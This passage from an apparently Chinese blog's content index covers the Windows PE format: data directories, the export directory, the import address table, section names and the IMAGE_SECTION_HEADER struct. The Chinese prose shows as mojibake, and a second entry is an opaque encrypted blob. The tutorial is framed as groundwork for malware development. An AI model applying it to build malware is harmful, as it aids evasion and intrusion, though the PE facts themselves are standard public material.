comment">// Load Configuration Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</span>   <span class="token expression"><span class="token number">11</span>   </span><span class="token comment">// Bound Import Directory in headers</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_IAT</span>            <span class="token expression"><span class="token number">12</span>   </span><span class="token comment">// Import Address Table</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</span>   <span class="token expression"><span class="token number">13</span>   </span><span class="token comment">// Delay Load Import Descriptors</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR</span> <span class="token expression"><span class="token number">14</span>   </span><span class="token comment">// COM Runtime descriptor</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/4cf8bf30b17a1e800995163d25868ac0_MD5.jpeg"></p><p>ä¸‹é¢çš„ä¸¤èŠ‚å°†ç®€è¦æåˆ°ä¸¤ä¸ªé‡è¦çš„æ•°æ®ç›®å½•ï¼š<strong>å¯¼å‡ºç›®å½•</strong>ï¼ˆExport Directoryï¼‰å’Œ<strong>å¯¼å…¥åœ°å€è¡¨</strong>ï¼ˆImport Address Tableï¼‰ã€‚</p><h5 id="å¯¼å‡ºç›®å½•-Export-Directory"><a href="#å¯¼å‡ºç›®å½•-Export-Directory" class="headerlink" title="å¯¼å‡ºç›®å½• Export Directory"></a>å¯¼å‡ºç›®å½• Export Directory</h5><p><img src="/Rxi134_FILE/026f1d5122663a7d45c2801a475d563e_MD5.jpeg"><br>PE æ–‡ä»¶çš„å¯¼å‡ºç›®å½•æ˜¯ä¸€ä¸ªæ•°æ®ç»“æ„ï¼ŒåŒ…å«å…³äºä»å¯æ‰§è¡Œæ–‡ä»¶ä¸­å¯¼å‡ºå‡½æ•°å’Œå˜é‡çš„ä¿¡æ¯ã€‚å®ƒåŒ…å«å¯¼å‡ºå‡½æ•°å’Œå˜é‡çš„åœ°å€ï¼Œå…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥ä½¿ç”¨è¿™äº›åœ°å€æ¥è®¿é—®è¿™äº›å‡½æ•°å’Œæ•°æ®ã€‚å¯¼å‡ºç›®å½•é€šå¸¸å­˜åœ¨äºå¯¼å‡ºå‡½æ•°çš„ DLL ä¸­ï¼ˆä¾‹å¦‚ä» <strong><code>kernel32.dll</code></strong> ä¸­å¯¼å‡º **<code>CreateFileA</code>**ï¼‰ã€‚</p><h5 id="å¯¼å…¥åœ°å€è¡¨-Import-Address-Table"><a href="#å¯¼å…¥åœ°å€è¡¨-Import-Address-Table" class="headerlink" title="å¯¼å…¥åœ°å€è¡¨ Import Address Table"></a>å¯¼å…¥åœ°å€è¡¨ Import Address Table</h5><p><img src="/Rxi134_FILE/9ea33c8f5d1827a9caaab901a53cd8c0_MD5.jpeg"></p><p>å¯¼å…¥åœ°å€è¡¨æ˜¯ PE æ–‡ä»¶ä¸­çš„ä¸€ä¸ªæ•°æ®ç»“æ„ï¼ŒåŒ…å«å…³äºä»å…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶å¯¼å…¥çš„å‡½æ•°åœ°å€çš„ä¿¡æ¯ã€‚è¿™äº›åœ°å€ç”¨äºè®¿é—®å…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„å‡½æ•°å’Œæ•°æ®ï¼ˆä¾‹å¦‚ä» <strong><code>kernel32.dll</code></strong> ä¸­å¯¼å…¥ <strong><code>CreateFileA</code></strong> åˆ° **<code>Application.exe</code>**ï¼‰ã€‚</p><h2 id="PE-Sections"><a href="#PE-Sections" class="headerlink" title="PE Sections"></a>PE Sections</h2><p>PE æ®µåŒ…å«äº†ç”¨äºåˆ›å»ºå¯æ‰§è¡Œç¨‹åºçš„ä»£ç å’Œæ•°æ®ã€‚æ¯ä¸ª PE æ®µéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„åç§°ï¼Œé€šå¸¸åŒ…å«å¯æ‰§è¡Œä»£ç ã€æ•°æ®æˆ–èµ„æºä¿¡æ¯ã€‚PE æ®µçš„æ•°é‡ä¸æ˜¯å›ºå®šçš„ï¼Œå› ä¸ºä¸åŒçš„ç¼–è¯‘å™¨å¯ä»¥æ ¹æ®é…ç½®æ·»åŠ ã€åˆ é™¤æˆ–åˆå¹¶æ®µã€‚æœ‰äº›æ®µä¹Ÿå¯ä»¥æ‰‹åŠ¨æ·»åŠ ï¼Œå› æ­¤è¿™ä¸ªæ•°é‡æ˜¯åŠ¨æ€çš„ï¼Œ<code>IMAGE_FILE_HEADER.NumberOfSections</code> ç”¨äºç¡®å®šæ®µçš„æ•°é‡ã€‚<br><img src="/Rxi134_FILE/7c3ea14466fc67f80d7394551252c0f7_MD5.jpeg"></p><p>ä»¥ä¸‹æ˜¯æœ€é‡è¦çš„ PE æ®µï¼Œå‡ ä¹æ¯ä¸ª PE æ–‡ä»¶ä¸­éƒ½æœ‰è¿™äº›æ®µï¼š</p><ul><li><strong><code>.text</code></strong>Â - åŒ…å«å¯æ‰§è¡Œä»£ç ï¼Œå³ç¼–å†™çš„ä»£ç ã€‚</li><li><strong><code>.data</code></strong>Â - åŒ…å«å·²åˆå§‹åŒ–çš„æ•°æ®ï¼Œå³ä»£ç ä¸­å·²åˆå§‹åŒ–çš„å˜é‡ã€‚</li><li><strong><code>.rdata</code></strong>Â - åŒ…å«åªè¯»æ•°æ®ã€‚è¿™äº›æ˜¯ä»¥Â <strong><code>.const</code></strong>Â ä¸ºå‰ç¼€çš„å¸¸é‡å˜é‡ã€‚</li><li><strong><code>.idata</code></strong>Â - åŒ…å«å¯¼å…¥è¡¨ã€‚è¿™äº›æ˜¯ä¸ä»£ç ä¸­è°ƒç”¨çš„å‡½æ•°ç›¸å…³çš„ä¿¡æ¯è¡¨ã€‚Windows PE åŠ è½½å™¨ä½¿ç”¨è¿™äº›è¡¨æ¥ç¡®å®šéœ€è¦åŠ è½½åˆ°è¿›ç¨‹ä¸­çš„ DLL æ–‡ä»¶ï¼Œä»¥åŠæ¯ä¸ª DLL ä¸­ä½¿ç”¨çš„å‡½æ•°ã€‚</li><li><strong><code>.reloc</code></strong>Â - åŒ…å«å…³äºå¦‚ä½•ä¿®æ­£å†…å­˜åœ°å€çš„ä¿¡æ¯ï¼Œä»¥ä¾¿ç¨‹åºå¯ä»¥æ— è¯¯åœ°åŠ è½½åˆ°å†…å­˜ä¸­ã€‚</li><li><strong><code>.rsrc</code></strong>Â - ç”¨äºå­˜å‚¨èµ„æºï¼Œå¦‚å›¾æ ‡å’Œä½å›¾ã€‚<br>æ¯ä¸ª PE æ®µéƒ½æœ‰ä¸€ä¸ª <strong><code>IMAGE_SECTION_HEADER</code></strong> æ•°æ®ç»“æ„ï¼ŒåŒ…å«æœ‰å…³è¯¥æ®µçš„æœ‰ä»·å€¼ä¿¡æ¯ã€‚è¿™äº›ç»“æ„ä¿å­˜åœ¨ PE æ–‡ä»¶çš„ NT å¤´éƒ¨ä¸‹ï¼Œå¹¶ä¸”å½¼æ­¤å †å ï¼Œæ¯ä¸ªç»“æ„ä»£è¡¨ä¸€ä¸ªæ®µã€‚</li></ul><p>å›æƒ³ä¸€ä¸‹ï¼Œ**<code>IMAGE_SECTION_HEADER</code>** ç»“æ„å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_SECTION_HEADER</span> <span class="token punctuation">&#123;</span>  BYTE  Name<span class="token punctuation">[</span>IMAGE_SIZEOF_SHORT_NAME<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>    DWORD PhysicalAddress<span class="token punctuation">;</span>    DWORD VirtualSize<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> Misc<span class="token punctuation">;</span>  DWORD VirtualAddress<span class="token punctuation">;</span>  DWORD SizeOfRawData<span class="token punctuation">;</span>  DWORD PointerToRawData<span class="token punctuation">;</span>  DWORD PointerToRelocations<span class="token punctuation">;</span>  DWORD PointerToLinenumbers<span class="token punctuation">;</span>  WORD  NumberOfRelocations<span class="token punctuation">;</span>  WORD  NumberOfLinenumbers<span class="token punctuation">;</span>  DWORD Characteristics<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_SECTION_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_SECTION_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¯ä¸ªå…ƒç´ éƒ½éå¸¸æœ‰ä»·å€¼å’Œé‡è¦ï¼š</p><ul><li><strong><code>Name</code></strong>Â - æ®µçš„åç§°ï¼ˆä¾‹å¦‚Â <code>.text</code>,Â <code>.data</code>,Â <code>.rdata</code>ï¼‰ã€‚</li><li><strong><code>PhysicalAddress</code></strong>Â æˆ–Â <strong><code>VirtualSize</code></strong>Â - æ®µåœ¨å†…å­˜ä¸­çš„å¤§å°ã€‚</li><li><strong><code>VirtualAddress</code></strong>Â - æ®µåœ¨å†…å­˜ä¸­èµ·å§‹ä½ç½®çš„åç§»é‡ã€‚</li></ul><h1 id="å…¶å®ƒå‚è€ƒèµ„æ–™"><a href="#å…¶å®ƒå‚è€ƒèµ„æ–™" class="headerlink" title="å…¶å®ƒå‚è€ƒèµ„æ–™"></a>å…¶å®ƒå‚è€ƒèµ„æ–™</h1><p>å¦‚æœéœ€è¦å¯¹æŸäº›æ®µè¿›è¡Œè¿›ä¸€æ­¥çš„æ¾„æ¸…ï¼Œå¼ºçƒˆæ¨èé˜…è¯» 0xRickâ€™s Blog ä¸Šçš„ä»¥ä¸‹åšå®¢æ–‡ç« ï¼š</p><ul><li><a href="https://0xrick.github.io/win-internals/pe2/">PE æ¦‚è¿°</a></li><li><a href="https://0xrick.github.io/win-internals/pe3/">DOS å¤´éƒ¨ã€DOS Stub å’Œ Rich å¤´éƒ¨</a></li><li><a href="https://0xrick.github.io/win-internals/pe4/">NT å¤´éƒ¨</a></li><li><a href="https://0xrick.github.io/win-internals/pe5/">æ•°æ®ç›®å½•ã€æ®µå¤´éƒ¨å’Œæ®µ</a></li><li><a href="https://0xrick.github.io/win-internals/pe6/">PE å¯¼å…¥ï¼ˆå¯¼å…¥ç›®å½•è¡¨ï¼ŒILTï¼ŒIATï¼‰</a></li></ul><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ç¬¬ä¸€æ¬¡æ¥è§¦ PE å¤´æ—¶ï¼Œç†è§£å®ƒå¯èƒ½ä¼šæ¯”è¾ƒå›°éš¾ã€‚å¹¸è¿çš„æ˜¯ï¼ŒåŸºæœ¬æ¨¡å—ä¸­å¹¶ä¸éœ€è¦æ·±å…¥äº†è§£ PE ç»“æ„ã€‚ç„¶è€Œï¼Œå¦‚æœæƒ³è®©æ¶æ„è½¯ä»¶æ‰§è¡Œæ›´å¤æ‚çš„æŠ€æœ¯ï¼Œå°±éœ€è¦æ›´æ·±å…¥çš„ç†è§£ï¼Œå› ä¸ºæŸäº›ä»£ç éœ€è¦è§£æ PE æ–‡ä»¶çš„å¤´å’Œå„ä¸ªèŠ‚ã€‚è¿™éƒ¨åˆ†å†…å®¹å¯èƒ½ä¼šå‡ºç°åœ¨ä¸­çº§å’Œé«˜çº§æ¨¡å—ä¸­ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.Introduction To The Windows API å¯¹windows APIçš„ä»‹ç»</title>
      <link href="/2024/10/03/7.Introduction%20To%20The%20Windows%20API%20%E5%AF%B9windows%20API%E7%9A%84%E4%BB%8B%E7%BB%8D/"/>
      <url>/2024/10/03/7.Introduction%20To%20The%20Windows%20API%20%E5%AF%B9windows%20API%E7%9A%84%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="87f6cd3add92e5f681beb51e2a86bf4fd7387a34d555675e20c6c8bd558de3d2">2239f6ef2369263b61ef594c41be1d81caaad9e00dfd39e2e6679848a71a75425b783f2084bbe71c207ed1c250fb2ed6cefc9a851b67880d7dd7f0b02318ccecec0a1f5749dc5908d23dee16a3508513fe37119411562cbbb5d634a272aff775a373ac98b3884e5a190f33cef1784e3bcd55b845840ce435caee287f5e0985dc1659a1fff3db5bfcdddfea676c453645b7d4c98a9b1c95d15432f8b252ad1a76b67698a210307ce111a38e722a06ffebd1809895bb82b7fb05ac1f50cff9946dd85bacf2725e66c11e2957861c51f1759e574409277083776ce4f541088a49cde8fbdeec86caef1640e3edf36052b7844d91356c43c855c36e4f7ad3a694c96f5ebe87e6b194e2f90024d9d1d2771b3068be6dc6d3751fedb37195f2bd1bd5dbadefaf754089733c95e3c1beebf4ff8808bcecb137a06232f5195fed2cec55b1a0742e44f105a78ad5df49632acf001a25dd3aaf5db7427a7aac35f293943ade5c6c5771606e8bd94f836cd262077a908ec9bfdcaaffe13da0848f4b2b3e7ecf154cb8b9ebdfe2eb129a6c936a97c6c82428b6123a25c310061bd419ee65d8f725698fab26a23d5baf1271a123a7aa029fa2495c968596a107ed20ac5ed04f02a65ac1e66c870943fd44225384ec87bc5f4a43bdd472f9c10b11b3895d3b83ac9d5443a7f9093f80376fe98acc77fea3e528544c260dace5279943e672e643497b7cac0e7935d5caeaa991c4caae60a395ce0dc4cc9e339dec70362324e165e056568b3d23924e644fedf187abafc575f99bdcd9b71a99ed681fce5f3486a3a753501cdedbc1c96e8356f9a409f7ca20969b3326def8eee0d23f42aa8e02263185906e32c060e317fc29e6df6b2df9e826a7579579515612e05e8f891b5cb64a62a35f66f600bacfabd692b36f3f3ed867b0a54632387862a62e18a1510d759a36233299a28c4ed0d890aaea9207d5145b7659944f1aaf0d6e006be8e3a353ddf717321f04c33ab5404f4f40a5b501d6504933db1d6f934d0580f4065c756a0f3f0834dc3c2580ac7b4265d8416f93a7dbf6b0c6cd31311013b607ebd0896e3b0816c22455659834728b8a13552c423575d53fecbb431f3a48950c2daad44f3edfdf769db5233b6cf4a4e22b1703aa66a5780bab21f20300400345fbf86d71c802814ee8ce40ab31de38566a17753b237fe1f7044650a2ba3aec9e40d3e74eccbd0bf5c20fe5ce165c7188cc207c2f25da259e643d0c1bad4e49b3001ce2e6235894c9cb745e6561b49b7bcb0c433eafb0a0ff60ef3b415724022286b06a73639a98d7be0a9c915350cf7d1f113d2179b98129d49aab577544ccc00e38ad076e5049230997e7ca78da99a6a87dc0a3d457757a8982ebb7d7718c0b0cf78b3dfd1cd67a8a32752e4d2cce8fe58a137143f0dfa9d22fcaa662a9abc03e02bbe2d78565e443bfcec917d6d60114d603441a9d3f0094ae5934d35b7e40a6418abcbf0f98eb8b0b1399d043dba3a6bcc02fd4150483d42f2e313fee4ea006d20c562666f818dff9dc1a2ad60a900ce41cc839e2374d48939f1700821f4fb7890c96a0021b711038fefb0d0bc03688c909a30891b6118447199890f120b24c8cec74312577225f1a500a83d76c60b013381b77c1756b2c6651a76e325e9b25013709b7c5b7c7732bea0760bc58a3cacf3369debd1f212a8ab157aa66be0647fe60593ebe748e3a764b4fdefe050e5aa6c1a6809ecd33b16bf1753243cee9e67320937ff7aaa312a409bad57e0bd2d23e36bb0757ddbeb54f40deda80415bb2f6a9b93ef4d515536b8ad6b63d13eaec768a88d92f4adc25219117b1ff30f6a321621330ab67f0788e9ffc5396966b83b16d7c6c413c4a13c928be7997ce1dcd57785c9f66680d8b481e2ca87354d51188a0300f26364806d70a9dae012ef08cfd6d2500133cb58aab96ad8baddd5da5b1f447ce9d01021198c602b213918765f2eb8bf29fbe89471652bd7b024adcfa98a68e9feb8e7b9cc95745fcda417b61274992ba8eda0769940aa883c25a1c76d552ce50364bbce01e41c2dc65d696c2bee88c73f7b2037123ce61a9ac998a652b9efa6fee094c096a21d6006160feed55cdeb392e510c073486625863ee76ace6871c703c8ecdc12f3ed391bf9ec3a390f92ad2b31d571c43dbc0e6b5a0892eea67c552e51da944d664a704481d78578be7e1db2ac8f8236e71aa87bb5b28baeacaed9692637f4de2fdebe93e15ba3ffff86263a0e1fec3cb4d966bfda635fb816aef1f7d9b86edaed4b224c289cddf9ca819f3316d40a8d815076dea02002dd57305063d09b93763efb1990b93f0b23252226cd268c213d9a01e252025981d011b04058bd1790141c836b60edc54bf5f20e81697281b05b4a2788380fe027ad4b0f144b4f75d5695a8ba12800a77f02743ac66639da0464c43e623e58067e370ac260e93e81d254ca4e5117208a2904f4bd5d9a768159deb4dc04cffffb5a2e2191c24104b350a2133da0e0e2e279d43175f07d2f39539c4f58d1600730b6912179208b366eb55e646df50da19a2bce8ce927d3a8bfaae99ac99f80734437805495ef6d6f56f5c492053bed81c0d8e340c6118246436bfbc3ed99bcbd9811dc64080d813ecd5d5a005bfe9e5a08579175141f8479b5e3644f28778b6e11a4cd12a248a9b4fe5d5f7db62677be7b13ec565c122e85e5318978ca9e9506360202e25a4e437ab7838f07e417c9d1434ca068e4c829cc6777c93c5b8772afca15d9c5fe9919aac9f22c875c88b9c10b4a8ea18f69df745f34382346b0dee984022b10e508712fd2267e430f4e33accfd9b6b3a985d89224da7602bd1101a99a05be8f465389ab5c1bc384f03aebda366f614d6eb43b6ecfc162b7cda3e43d4ea25b192bee03ab25063fa014ed5a35c8940322c07ad62921d8f97d04e6cef407db5cba6c2802a74aee5c730db75cd4ab7c1a76e06247f7c4ef04c8facacae98d134ed482a3a826f80bdaa4f23c6a8088e7e6e40c87a38f442f0c67923b47577b5b81d32617c76758722d50e938fc8a5ffc739f345b7502db645777a7923fff36f0d78cafc75317aa3a7ffae25ff00a9e8dca10d7e2d4a7127c2b75a084f4f066107841d439404b31219c401d506bf82b952598972b8513bf3d26a4690069264dce6f6cee980c06b657b439255a5c9da67bfc0de7c992e6118cd1c2388ecfa438c904043b227df1eb73a03d1363a630afc61acaf4940a3244c8350d4565a5d53b45b6a1a90c9b22e4b8012f9baaea969830f7f5f920e435fa7c2659918439b563b419000b3d6fd7f29ccb2b14ee10e2de77a95e57670b0743ce7966dfc63607226675b38cad45102ff13d0a3f23189e1abbdc83e4213537dc78f96cbcc5f6383f409c5346d0b4ee49d900eb575581f381fcd87bb42d2e35b122b1ab4f75dd3ab37deabac730a513e43d568c277fa7a8e84516e608c0496892d6bef3dce5d1529aecf7dffdf1ae96d8167047e6b9d3333d5ab6248869afd813097df19ef69222c6d179c098cd87816b4251960da117ad71977ba63e6fb7f26006f6bbdeb00f6cf60622eaf1a77b460193d092f39a9b647f7ebc79588e5114a3a3c71b1c943194c4bcba158ce32301daed34f8529b71c212fe35595fcfea8b29fbea9e04641a99e5478795adec44d3d8ad07a8d19dfbd58b8429e8e3125df1ca067f05131a7210c2f2b0cea20b5c8bd920d10a2b9c2ec95130b8fde8c42dbad5c2ff7414c2b347cec5ab378969d638ae23f5e1105e67b0f58fd8a4784c62b0a0c7348639e2fc6f6c2d4c7f87a8a211e9270b2ac2354bb41a6f6967c33ea2ffbcf83787c7ac1aa217da2cb02a6fac446a58d6eb39e54991de964bc8f3f2b7ecea7f88e8c378f6d97bf1081cad2500b617e939e7d1d7bc15292db4f65ae9e2975d7b75211e7bbc888ea0ab79d38cf4e1f10711616260e7c3ff2a85117018e192e806c754940a4c2809723246fbfd022473eb68402c93f1bf352fb3b708aff1197bf6abd637126cc9bf513984dcb14f1fee28c986d660b8e20559016b73caddf61e213b8b0fb6d64c41fa85bfe332caf33596ce86e5edbfb73841a3d4bff76a13f259e04cb39ec1a2fd85e45ce2d99de21417cac4f09dc0555f5206ecbb00e82965ebb15eb35c1fa5d14b6881c60df5d922e4475cf5d030c02d214cb4064a49c385ebeaf2f5c0e164a7cd9e7aaf982ccab8eb16c1a9fc6e9f452d7f2a253daa01e86f5ec05b50c8324f83f94e7d8d4c8a2ec50878a3983508777e908f83f540ca022bdf4a690c71fdef41716c08440e1aa57eabea9594e25dd96787d7d3fac43102d54377d5ce342cbf38e8f72ba3cd84b2935b887ce174b7c1f7a47a13ea3a50137ed7a528cc1766b9cf2c2447ab81f8be907baf84d32296c0eea798a388b4d3451e0205a273c3ad41f8dfdfc7837de79928368511a3895d2fc82579f4f36186329fa099a091ff14b55a5fca99fc02a605c1afcdbd6e9d12b1f7cb3761fc776188c445cc9a252779e4341c25ee07deb7fd7950b801f37ba6ea14ca575f6acaf589c5d1712d73b8a4d3daea840bab446958aefb7c63fa17b6bed96067011ee65359fe9405da26dce5fa217369c64bae9d3171cb6c652c766b878d7f54942f8d10f909f9d82e3e41d4259867afd35feb53eded82254acd170bf6f663c9732b4108492e01186fae2137d9d9d779cd4976f313a3286ca7f6f416933f212c01a9505a6f9e72465776606bfa32149621fcd96aaa1badd0e0bf6d0b52f744d4bbc4f19298e5fa43c136d232fea7d2e699a27f00d1e013e02d6892f7c45eeebd33d3b0dc5d85ff0ca2477c31b4ec1a18bf62d2dfb4f94c4d69de4758550b6699b0a4aa1a4f4219515a76f70bbda2a82d93729df65cb5c23aa96ff6065cef44cdd988ccfc39c01fd761f475509bea1036aaecdbbb96329bb5ea32d658b151434b6a6772b330c87da006da3930b48bbfb735785179163eca0e0815590a2807319a21e9d2887e94d8a674868f932d6ab34eaf6b8463f684bdd33cea5c6f6c2f8fe182ccc61b94f1a9c7081828643aa027c33a4059761c4b9465edeb56c207d1a2cca1e5812980b95e0a6581cdbf241c477cd31e188800e2308b6d0ae0e0d818e54c4268f72baaa41f80668cf85f9060bfc7a46f1a3c07b106133f78e199b8e01f49df0eda8a2c909ce674ecb0884b02e4930d7aa8d7fbc18e89d79aa1146c5c0c3cd405b15c34f76d7f02149146f43f698af8826cbb9cd4b635c1d457173c371441f14f00a0c5494e50f60bf06b75acac3ff91fc18fc7ba7e84b33cc12871dea506cd5e357860bf9b5ee45277a064e52c008107d72c36d285e4472b1c8efdd5719927f8a8c587da89f85d7fdc17a6e3d7ff028dfcd1440ee9f50e0a9bac3f34de8655c1c44506375ef445ded4b39e02e37c4c0a7055366682e06ebf6f1d21f43b8bd5c8e10b505f7d9a266e534087bcead509f10c69514390afa9d019aa16c5cd749ff1951fd73e72efe84786e30ba9e5f784ca8e127fb24cd823aa814af6a52139c2cd288cc7a35140582361f7bafac3de8068d0275a94315114cb7f23e2165cefe62bb2c498bdafbe3990c44b651bb1d1aea78a55fe799296c729dbf034ce5b892ea8cb6948ae773ee53ce130e5f802566cbb321050d9991975e04746179fb3f080777f4fddaa5dfcd88cb2dd9026c553ac27fd12cc3c1c733a6951075258a9e9ee6a1569732e2774acceb967a441371efdbdfe45272d657105006f1ffc8b071997b59c2c9261f2515c90842716710f8b2400521a5fca521207feb95e6b0e715913d77b9ec3451409b8beb4063503b65d4d5b93b6f2b78af5f1686a82eeafd4ae571d257d2e3c8a61e863e750f18b3657f58458cab9128cbb29eb78611d9d93e4c0278e4dc08eecd14ad0e96c41a9800bd98eed74dd8d5a43c203e367fc09372015c2d4b423e1170bfb094630f2d1b70afa420fc6b234038a77c3052bb61c7c7d25d7eb43f526470fedb6767d7308e26f46f85c0072adb669ae1a2775f50bfa0115861067c85ffea527858eca904805395ec67bf7d9237463bb2120e7fd966d2a8b33f29a473594aadd9fc0b8dc35501e5916fd1732f48f9ef49ead8217edf7d8683075fee821e14efc198a6e5b75eac31ffed669a565834aec934eab0d2bab540568198b684de2ae26daed1c56de74e3c95e973f0b01a9720dc2e333c2be64f14f4dee0d09b02b1174618bc99b2bc35596e4d664697b17e8ef9d2a496274f4c44192f7569d38123ebc7a1388218f1c83e24b671b77252faf27e1ac8b9bd9a8c716ae4a050d9f8c6d72d7f4a2659a44cbc150edf304e87144676b934be6a2a3a4af1fb8db46be91ffaafeccf5cf668548df72fd32b00f80826facb356bf3f3738487ffd57263c5e2e5205a4a335856d6660c50c5d5eece6a4b2b7e7f8fa600e88e84cddfaed5eb1d08f44a68e86e33219bce0d3d8473480293f5a2f94271dbc556dbcc7ecb9291224c438c0a8bd050d5e727556b6d799e9d5b302b11419b3f71ee9cf4fb28bde26d3797432054d59a779a7967bedfc9a34e4810bd79c6a19ad1a8e72d854a8cc310adc3c30d26ec59df5a2782983711080188e0569436096ebc29293c41fd42e1a9514cf73ff49c6e7b120945b621a0175d5ca892c72aa3d5a956da01b2893b178b806e40b11731507821684292904fb88e201730966308c63776d40a0bc48a2e08619b41a900657bf103ffb2ebdc8b41469ce18af66612a87706f301c6eaea7c03ffafbc7e285a87a4d9fe9ab5b137847ac5f2978b976221c420c877da5a0f732866f5bd6c543ab6f7fef3b212b97e3df8c15608bb98886e43a3fa5bf2767881633176ba51ce87f57a1955bcec8702ae40f1164a11fb2f1dab8819acf9e0e9ff2e9cbdb747a68641b9acd3f9fc17f9fb757882869bc8a9ab85de06c9ef42364caf666e08821843a54f4073919cd20d723091e19fee342a743144c71bfa4358a4d93dea3f047ad6a80efd92256d268081205d22b848bf4a6998218d6cb136d16df41c8ccf6196ebbce180897db61552199d2cdf3ba7c300c228fa4a1ca2ea47b1af0cc3543f02bf232864be4276788de1ccda5cb1786ef3b6d708c23148ff959ab1e011ace6e535e579a5d96ec4f8013a06f451f42d17b85c2e2dba221f5547fba9b6972727c3abb47e3b0fcd7f5726af1ae387727227e3019dadb58bf330776f4a17f95ab7eb1349b498d97cc343dd3b55d01f744cc189fead455f0da6211ff97baec2209bfa7053b0b6af3f07befc4e008a28c9899fbc01713ced8e3c50e03b8b06764bedf74c97eb04d400fb1cf746fbb41624d3b64634725ddc5c0cf64d8772454f8201fbed7fb48a43a3f86ac94d361e64cb11b0cf3ed705cf546ea0488ca2cb0d5bc04b1c4da1cf9c489ec063bd5db12cde86319b085d5632727a93e1105572b84fc8e0cb4752579711fc84a1de1aff3020ccd8dd3958811c60dc22e0dc70c08f4b64eb627feea95223d2d81ab8faddf52c551923bf0dc3b7b5ae014b59f9291762dfcdce2777841d8ada92f88e4aa464be3c31b4084f8e8be75101b305dcd186a2f740bd45598eafbe30be61a5274a585e5214ea4d1d8d70466ae7afc7b1e9d21399dd082b6aea7f77c88cf0e36be827c3f46fb5d43d0db444940ec14723b173ea55a9428aac46cd5e8e9dc0c7b3f6ec24c4351681e927d2b831dd11c041e9eafdb5c392711a55f47921d1f1ba00eae47a6213de64ff13ecd350aabac2a264e8178753e1c029e8b72658005bcecc8f3c80f6406f711393fe7017ed5bb014293bfafed539b12eb8313ee80fa5e719a057cb1e053eab392ff0c5ae1da76b45005d92849b1b44cad236380403ee81350eceff0dcf1006f9a271dbd89cbf7ba793d3eb3d0f08e90be8557bcea0e9777dc650b6740db833619f6d41570218cc861281ce4a045def2f69b7c2a367370193f3fe78a3edf168535b52ac0fd5bf013680a9cf88f66e89ec50cdd9d1539664bcfca0ae6c3279c67089f052da422c65a88a991bddb74b9462acb8d486c2647769368712f21b401f09a9dae3f30b4ef0abcc3129b8707b3f5e8d3917560b1027e2a339880364eeebbadc5ee65adc623c58a39f96114d5838f6120eacd44ec39c92d726a2783670e3a9d96bf6332c715c76c78e92d396f8383d248773c1bce0d93aebe399553136bcca51f81b01ed7b066cb531787dfd29414c39994e419595cbf9d2585f69b017c670decabb7c2a947ce63304a5a16327bf25f75010b0dc863405904e8bbeb499fe2b62c9538da94ede3666922ee3e8d55f8ec78db645f69f166ee00c8f732e0902f3237fff65efdace5e06274737d6dba8515423044c605e1244e820b516ee033ecd88f4f56ba6d7436b9ec85448654496e0f9f6709cf5ebb23f14887beed0063d6ebb1c82a9f9376ce1f903266cfda8c31b89b67fd8d3347a3accaa43aaab062f4441b7f65b6c0aa823f293866db3c9ecbf61de5bf9cceabbcb4b7e7f159bcf1de1d7e4addf58153cb40949e5b523f6ef377ce8d59eaa9c31456f3313f6a7d1ba1d1b9e9c7ab5f5ef0d6f331a3012fbcd39c0877a561737aa245931c67d91b6d2e60b86e2818ba1b883865771b61a468cb4cf1c42c930863edd0d5a0c1aaecf5724a11bc2d69ba7fba3caa2bf8def8905ad95f1eb503bad72f3d465835091807e01dac6a48fcdaeb9f67fdb9ecbe1140b69954b2d68cb95b020aa04e5fe2e6dc6d2a3837da1c0193adb8036d39b9d156fe1b338bf39eb871c1907de748e040f66453fc8ca6ec57c9a71e5ffb79845ca9f6ce78909e958bb44ea1af0fe7ef8fc0ab472b6976c3bfc39b9bf4fa5a3540955a521e714974b0f6d7bef54282221c30e846471a6c8672b8cb5e82c95bad42fb582efac5aba5f32f80e55513058f511efbbef64ef4156283d614bddaf4fd943b7bd7c3710da80f62d16a03b192dd59287efded017d1a95af97e358e417586805b2d692ea6ae39d22f75976a8989000a5bd5779d51616cff0a756da74255a35a63534fa84d58479cb610791ce5520fc08275b7aae44326a09b38a18d4241323c06be6f88679dd2b1abc3377784636a797e655654d1a7294759d8536a7d934626be0ba214aaa873e759338961fc1001dd119cefb680f142bda098aa0285b563d502b97fc86d5a5afb57de78220c